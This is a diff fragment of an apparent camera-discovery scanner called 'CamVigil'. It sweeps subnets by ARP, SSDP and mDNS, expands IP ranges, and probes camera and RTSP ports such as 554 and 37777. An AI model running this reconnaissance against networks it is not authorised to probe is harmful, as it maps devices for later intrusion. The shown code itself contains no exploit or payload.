+        output.append(f"🌐 Scanning Subnet: {subnet}\n")
+
+        devices_found = {} # ip -> info_dict
+
+        # 1. ARP Scan using Scapy (Most thorough, but needs permissions)
+        output.append("📡 Attempting ARP Broadcast Scan...\n")
+        try:
+            if not IS_ANDROID and SCAPY_AVAILABLE:
+                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=5, verbose=False)
+                for sent, received in ans:
+                    ip = received.psrc
+                    if ip != my_ip:
+                        devices_found[ip] = {"ip": ip, "method": "ARP"}
+                output.append(f"   ✅ ARP Scan complete. Found {len(devices_found)} devices.\n")
+            else:
+                output.append("   ⚠️ ARP Scan skipped (Restricted on Android).\n")
+        except Exception as e:
+            output.append(f"   ⚠️ ARP Scan failed: {str(e)[:50]}...\n")
+
+        # 2. SSDP Fallback (Discovery)
+        output.append("📡 Attempting SSDP/UPnP Discovery...\n")
+        try:
+            ssdp_devs = discover_upnp_ssdp()
+            for ip in ssdp_devs:
+                if ip != my_ip:
+                    if ip not in devices_found:
+                        devices_found[ip] = {"ip": ip, "method": "SSDP"}
+                    else:
+                        devices_found[ip]["method"] += "+SSDP"
+        except: pass
+
+        # 3. mDNS Fallback
+        output.append("📡 Attempting mDNS Discovery...\n")
+        try:
+            mdns_devs = discover_mdns()
+            for ip in mdns_devs:
+                if ip != my_ip:
+                    if ip not in devices_found:
+                        devices_found[ip] = {"ip": ip, "method": "mDNS"}
+                    else:
+                        devices_found[ip]["method"] += "+mDNS"
+        except: pass
+
+        # Process Results
+        if devices_found:
+            output.append(f"\n✅ Total unique devices discovered: {len(devices_found)}\n")
+            output.append("=" * 40 + "\n")
+
+            for ip in sorted(devices_found.keys()):
+                info = get_device_info(ip)
+                method = devices_found[ip]["method"]
+                line = f"🔗 {info['ip']}  →  {info['type']} ({method})\n"
+                if info["hostname"] != "Unknown":
+                    line += f"     📛 Host: {info['hostname']}\n"
+                if info["vendor"] != "Unknown":
+                    line += f"     🏭 Vendor: {info['vendor']}\n"
+                if info["mac"] != "Unknown":
+                    line += f"     🔑 MAC: {info['mac']}\n"
+                line += "-" * 40 + "\n"
+                output.append(line)
+        else:
+            output.append("\n⚠️ No other devices found on the network.")
+            output.append("\n💡 Suggestions:")
+            output.append("   1. Ensure you are connected to Wi-Fi (not Mobile Data).")
+            output.append("   2. Grant 'Location' permissions (required for Wi-Fi scanning on Android).")
+            output.append("   3. Some routers block ARP broadcasts between wireless clients.")
+
+    except Exception as e:
+        output.append(f"❌ Critical Scanner Error: {str(e)}")
+
+    return "".join(output)
+
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
+
+def main(target_input=None):
+    if not target_input: return
+
+    print(f"\n{SCAN} Initiating CamVigil Reconnaissance...")
+
+    # 1. Broad Discovery (UPnP/SSDP) - Disabled to prevent freeze
+    # upnp_results = discover_upnp_ssdp()
+
+    targets = []
+    try:
+        # Support for IP:PORT format
+        if ":" in target_input and "/" not in target_input and "-" not in target_input:
+            parts = target_input.split(":")
+            ip = parts[0].strip()
+            port = int(parts[1].strip())
+            print(f"{INFO} Target: {ip} | Targeted Port: {port}")
+            scan_single_target(ip, specific_port=port)
+            return
+
+        if "/" in target_input:
+            # CIDR notation (e.g., 192.168.1.0/24)
+            print(f"{RADR} Expanding CIDR Range: {target_input}")
+            network = ipaddress.ip_network(target_input, strict=False)
+            targets = [str(ip) for ip in network.hosts()]
+        elif "-" in target_input:
+            # Range notation (e.g., 192.168.1.1-192.168.1.50 or 192.168.1.1-50)
+            print(f"{RADR} Expanding IP Range: {target_input}")
+            parts = target_input.split("-")
+            start_ip = ipaddress.ip_address(parts[0].strip())
+
+            if "." in parts[1]:
+                end_ip = ipaddress.ip_address(parts[1].strip())
+            else:
+                # Handle 192.168.1.1-50 format
+                start_str = str(start_ip)
+                prefix = start_str[:start_str.rfind(".") + 1]
+                end_ip = ipaddress.ip_address(prefix + parts[1].strip())
+
+            curr = start_ip
+            while curr <= end_ip:
+                targets.append(str(curr))
+                curr += 1
+        else:
+            targets = [target_input]
+
+        if len(targets) > 1:
+            print(f"  {INFO} Total Targets Identified: {len(targets)}")
+            print(f"  {ALRT} Large range detected. Fast discovery enabled.")
+    except Exception as e:
+        print(f"{ERR} Error parsing target range: {str(e)}")
+        return
+
+    for ip in targets:
+        # For ranges, we do a quick check first to see if the host is alive
+        if len(targets) > 1:
+            is_alive = False
+            # Quick check on common web/rtsp ports
+            for p in [80, 443, 554, 8080, 8000, 37777]:
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(0.3)
+                        if s.connect_ex((ip, p)) == 0:
+                            is_alive = True
+                            break
+                except: pass
+
+            if is_alive:
+                scan_single_target(ip)
+            else:
+                # Just a small status line for skipped hosts to show progress
+                pass
+        else:
+            scan_single_target(ip)
+
+    print(f"\n{DONE} ALL SCANS COMPLETE.")
+
+if __name__ == "__main__":
+    main()
